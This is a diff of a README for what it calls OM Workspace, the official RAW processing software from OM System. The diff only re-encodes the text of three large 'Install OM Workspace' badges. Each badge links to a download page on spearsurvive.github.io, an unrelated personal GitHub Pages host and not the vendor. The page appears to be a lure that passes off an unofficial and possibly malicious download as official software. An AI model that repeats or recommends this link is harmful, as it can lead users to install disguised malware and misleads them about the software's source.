@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install OM Workspace](https://img.shields.io/badge/⬇_Install_OM%20Workspace-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install OM Workspace](https://img.shields.io/badge/⬇_Install_OM+Workspace-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ OM Workspace is the official RAW image processing software from OM System (forme
 
 <div align="center">
 
-[![⬇ Install OM Workspace](https://img.shields.io/badge/⬇_Install_OM%20Workspace-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install OM Workspace](https://img.shields.io/badge/⬇_Install_OM+Workspace-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ OM Workspace is the official RAW image processing software from OM System (forme
 
 <div align="center">
 
-[![⬇ Install OM Workspace](https://img.shields.io/badge/⬇_Install_OM%20Workspace-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install OM Workspace](https://img.shields.io/badge/⬇_Install_OM+Workspace-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
